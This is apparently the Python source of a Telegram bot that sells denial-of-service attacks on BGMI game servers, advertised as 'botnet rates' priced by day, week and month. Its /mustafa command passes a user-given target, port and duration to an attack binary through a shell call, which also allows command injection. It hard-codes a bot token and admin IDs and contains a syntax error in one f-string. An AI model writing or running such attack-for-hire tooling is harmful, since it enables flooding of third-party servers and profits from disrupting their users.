import telebot
import subprocess
import datetime
import os


bot = telebot.TeleBot('7586114085:AAFjsaAF-OnPXxsJ3voWFPU1oaYOxX_c2fM')


admin_ids = {"6103581760", "6103581760", "6103581760"}


USER_FILE = "users.txt"
LOG_FILE = "log.txt"


CHANNEL_ID = "-1002378560744"


CHANNEL_LINK = "https://t.me/MUSTAFA_LEAKS"


def read_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, "r") as file:
            return file.read().splitlines()
    return []

def write_file(file_path, data):
    with open(file_path, "w") as file:
        for item in data:
            file.write(f"{item}\n")

def append_file(file_path, data):
    with open(file_path, "a") as file:
        file.write(data + "\n")

def log_command(user_id, command, target=None, port=None, time=None):
    user_info = bot.get_chat(user_id)
    username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
    log_entry = f"Username: {username}\nCommand: {command}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n"
    append_file(LOG_FILE, log_entry)

def clear_logs():
    if os.path.exists(LOG_FILE):
        write_file(LOG_FILE, "")
        return "Logs cleared successfully ✅"
    return "No logs found to clear"

def send_response(message, response):
    bot.reply_to(message, response)


@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) > 1:
            new_user = command[1]
            allowed_user_ids = read_file(USER_FILE)
            if new_user not in allowed_user_ids:
                allowed_user_ids.append(new_user)
                append_file(USER_FILE, new_user)
                response = f"User {new_user} added successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "ONLY OWNER CAN USE ."
    send_response(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            allowed_user_ids = read_file(USER_FILE)
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                write_file(USER_FILE, allowed_user_ids)
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "Please specify a user ID to remove. ✅ Usage: /remove <userid>"
    else:
        response = "ONLY OWNER CAN USE ."
    send_response(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        response = clear_logs()
    else:
        response = "ONLY OWNER CAN USE ."
    send_response(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        allowed_user_ids = read_file(USER_FILE)
        if allowed_user_ids:
            response = "Authorized Users:\n" + "\n".join([f"- User ID: {uid}" for uid in allowed_user_ids])
        else:
            response = "No data found"
    else:
        response = "ONLY OWNER CAN USE ."
    send_response(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            send_response(message, "No data found")
    else:
        send_response(message, "ONLY OWNER CAN USE .")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    send_response(message, f"🤖Your ID: {user_id}")

@bot.message_handler(commands=['mustafa'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    allowed_user_ids = read_file(USER_FILE)
    if user_id in allowed_user_ids:
        # Check if the user is a member of the channel
        try:
            chat_member = bot.get_chat_member(CHANNEL_ID, user_id)
            if chat_member.status == 'member':
                command = message.text.split()
                if len(command) == 4:
                    target, port, time = command[1], int(command[2]), int(command[3])
                    if time > 180:
                        response = "Error: Time interval must be less than or equal to 180."
                    else:
                        log_command(user_id, '/mustafa', target, port, time)
                        subprocess.run(f"./Moin {target} {port} {time} 1000", shell=True)
                        response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}s"
                else:
                    response = "✅ Usage: /mustafa <target> <port> <time>"
            else:
                # If the user is not a member, prompt them to join the channel
                response = f"You need to join our channel to use this command. Join here: {https://t.me/MUSTAFA_LEAKS}"
        except Exception as e:
            response = f"An error occurred: {str(e)}"
    else:
        response = "❌ You are not authorized to use this command."
    send_response(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 Available commands:
💥 /mustafa : Method for BGMI servers.
💥 /rules : Please check before use.
💥 /mylogs : To check your recent attacks.
💥 /plan : Checkout our botnet rates.

🤖 To see admin commands:
💥 /admincmd : Shows all admin commands.

Buy from: @SIDIKI_MUSTAFA_47, @SIDIKI_MUSTAFA_47
Official Channel: https://t.me/MUSTAFA_LEAKS
'''
    send_response(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻 Welcome to your home, {user_name}! Feel free to explore.
🤖 Try to run this command: /help 
✅ Join: https://t.me/MUSTAFA_LEAKS'''
    send_response(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, please follow these rules ⚠️:
1. Don't run too many attacks to avoid a ban.
2. Don't run two attacks at the same time to avoid a ban.
3. We check the logs daily, so follow these rules to avoid a ban!'''
    send_response(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, we have a powerful plan:

VIP 🌟:
-> Attack Time: 180 seconds
-> After Attack Limit: 5 minutes
-> Concurrent Attacks: 3

Price List💸:
Day: 80 Rs
Week: 200 Rs
Month: 800 Rs
'''
    send_response(message, response)

@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, admin commands are here:
💥 /add <userId>: Add a user.
💥 /remove <userid>: Remove a user.
💥 /allusers: Authorized users list.
💥 /logs: All users logs.
💥 /broadcast: Broadcast a message.
💥 /clearlogs: Clear the logs file.
'''
    send_response(message, response)
    
@bot.message_handler(commands=['joinchannel'])
def join_channel(message):
    bot.send_message(message.chat.id, f"Join our channel to use the /mustafa command: {CHANNEL_LINK}")

# Start the bot
bot.polling()
